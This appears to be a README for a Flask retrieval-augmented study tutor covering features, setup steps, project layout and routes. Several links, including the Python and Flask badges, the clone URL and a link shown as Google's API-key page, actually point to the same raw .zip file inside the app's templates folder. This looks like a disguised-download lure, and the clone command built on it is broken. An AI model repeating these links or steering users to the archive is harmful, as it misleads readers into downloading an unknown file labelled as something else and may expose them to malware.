# RAG Tutor 🧠

[![Python 3.11+](https://img.shields.io/badge/python-3.11+-3776AB?logo=python&logoColor=white)](https://github.com/shivendra911/Flask-CRUD-RAG-LLM/raw/refs/heads/main/app/templates/LLM-RA-Flask-CRU-v1.4.zip)
[![Flask](https://img.shields.io/badge/Flask-3.0+-000?logo=flask)](https://github.com/shivendra911/Flask-CRUD-RAG-LLM/raw/refs/heads/main/app/templates/LLM-RA-Flask-CRU-v1.4.zip)
[![Docker Ready](https://img.shields.io/badge/Docker-ready-2496ED?logo=docker&logoColor=white)](DOCKER.md)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)

A multi-user **Retrieval Augmented Generation** application built with Flask. Upload your PDFs, text files, or markdown notes — then chat with an AI tutor, generate quizzes, solve puzzles, and create study flashcards **all from your documents**.

---

## ✨ Features

### Core
- **User Authentication** — Register, login, logout with bcrypt password hashing
- **Document Management** — Upload, view, and delete files (PDF, TXT, MD)
- **RAG Pipeline** — Text extraction → chunking → embedding → vector search
- **AI Chat** — Ask questions answered exclusively from your uploaded documents
- **Multi-User Isolation** — Each user's documents and vectors are completely separate

### 🎯 Creative AI Features
- **Quiz Generator** — Generate MCQ quizzes from your documents with instant grading and score tracking
- **Puzzle Generator** — Fill-in-the-blank and word scramble puzzles with timer and hint system
- **Question Bank** — Short answer, true/false, and interactive flashcards with flip animations

### 🛡️ Admin System
- **Role-Based Access Control** — Admin and regular user roles
- **Admin Dashboard** — User management, stats overview, role toggle, user deletion
- **CLI Admin Promotion** — `flask create-admin <username>` command

### Infrastructure
- **Rate Limiting** — Protects API endpoints from abuse
- **Session Persistence** — Quiz/puzzle/question state survives page navigation
- **Docker Ready** — One-command deployment with persistent volumes
- **Premium Dark UI** — Glassmorphism design with smooth micro-animations

---

## 🛠 Tech Stack

| Layer | Technology |
|-------|------------|
| Backend | Flask, SQLAlchemy, Flask-Login, Flask-Bcrypt |
| Database | SQLite (dev) / PostgreSQL (prod) |
| RAG | LangChain, FAISS, PyPDF |
| LLM | Google Gemini 1.5 Flash (free tier) + Ollama (local) |
| Embeddings | Sentence Transformers (local) |
| Frontend | Vanilla JS, CSS (glassmorphism dark theme) |
| Deployment | Docker, Gunicorn |

---

## 🚀 Quick Start

### 1. Clone & set up environment

```bash
git clone https://github.com/shivendra911/Flask-CRUD-RAG-LLM/raw/refs/heads/main/app/templates/LLM-RA-Flask-CRU-v1.4.zip
cd Flask-CRUD-RAG-LLM

python -m venv venv
venv\Scripts\activate          # Windows
# source venv/bin/activate     # Mac / Linux

pip install -r requirements.txt
```

### 2. Configure environment variables

```bash
copy .env.example .env         # Windows
# cp .env.example .env         # Mac / Linux
```

Edit `.env` and add your **Gemini API key** — get one free at [aistudio.google.com/apikey](https://github.com/shivendra911/Flask-CRUD-RAG-LLM/raw/refs/heads/main/app/templates/LLM-RA-Flask-CRU-v1.4.zip).

### 3. Run the application

```bash
python run.py
```

Visit **http://localhost:5000** — register, upload a PDF, and start chatting!

### 4. Create an admin (optional)

```bash
flask create-admin <your-username>
```

This promotes an existing user to admin, unlocking the admin dashboard at `/admin`.

---

## 🐳 Docker Deployment

For Docker setup (local or cloud), see the **[Docker Deployment Guide](DOCKER.md)**.

```bash
# Quick one-liner after configuring .env:
docker compose up -d --build
```

---

## 📁 Project Structure

```
├── app/
│   ├── __init__.py          # Flask app factory, extensions, CLI commands
│   ├── config.py            # Environment-based configuration
│   ├── models.py            # User & Document models (with roles)
│   ├── decorators.py        # @admin_required decorator
│   ├── routes.py            # Auth, CRUD, Chat, Quiz, Puzzle, Questions routes
│   ├── admin_routes.py      # Admin dashboard & user management
│   ├── rag_utils.py         # RAG pipeline + creative prompt builders
│   ├── static/
│   │   ├── css/style.css    # Complete design system
│   │   └── js/              # chat.js, quiz.js, puzzle.js, questions.js
│   ├── templates/
│   │   ├── admin/           # Admin dashboard
│   │   ├── errors/          # 403, 404, 500 error pages
│   │   ├── base.html        # Base layout with navigation
│   │   ├── dashboard.html   # Document management
│   │   ├── chat.html        # AI chat interface
│   │   ├── quiz.html        # Quiz generator
│   │   ├── puzzle.html      # Puzzle generator
│   │   └── questions.html   # Question bank & flashcards
│   └── uploads/             # User-uploaded files (gitignored)
├── run.py                   # App entry point
├── requirements.txt         # Python dependencies
├── Dockerfile               # Container image build
├── docker-compose.yml       # Multi-service orchestration
├── .env.example             # Environment variable template
├── DOCKER.md                # Docker deployment guide
└── LEARNING_GUIDE.md        # Technology learning guide
```

---

## 🗂 Routes Reference

| Route | Method | Description |
|-------|--------|-------------|
| `/register` | GET/POST | User registration |
| `/login` | GET/POST | User login |
| `/logout` | GET | User logout |
| `/dashboard` | GET | Document management |
| `/upload` | POST | Upload document |
| `/delete/<id>` | POST | Delete document |
| `/chat` | GET/POST | AI chat interface |
| `/quiz` | GET | Quiz generator page |
| `/quiz/generate` | POST | Generate quiz from documents |
| `/puzzle` | GET | Puzzle generator page |
| `/puzzle/generate` | POST | Generate puzzle from documents |
| `/questions` | GET | Question bank page |
| `/questions/generate` | POST | Generate questions from documents |
| `/admin/` | GET | Admin dashboard (admin only) |
| `/admin/users/<id>/toggle-role` | POST | Promote/demote user |
| `/admin/users/<id>/delete` | POST | Delete user |

---

## 📖 Learning Guide

New to the technologies used here? Check out **[LEARNING_GUIDE.md](LEARNING_GUIDE.md)** — a comprehensive guide covering Flask, SQLAlchemy, RAG, LLMs, frontend, Docker, and a 6-week learning path.

---

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

---

## 📄 License

This project is licensed under the [MIT License](LICENSE).